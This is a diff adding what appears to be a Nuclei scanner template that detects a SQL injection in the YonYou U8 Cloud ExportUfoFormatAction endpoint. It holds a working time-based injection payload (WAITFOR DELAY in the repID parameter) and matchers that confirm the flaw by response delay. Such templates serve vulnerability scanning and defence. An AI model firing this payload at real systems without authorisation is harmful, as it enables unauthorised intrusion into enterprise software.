@@ -1,0 +1,26 @@
+id: YonYouU8_CLOUD-ExportUfoFormatAction-sqlInjection
+info:
+  name: YonYouU8_CLOUD-ExportUfoFormatAction-sqlInjection
+  author: iSee857
+  severity: high
+  description: YonYouU8_CLOUD-ExportUfoFormatAction-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '错误提示'
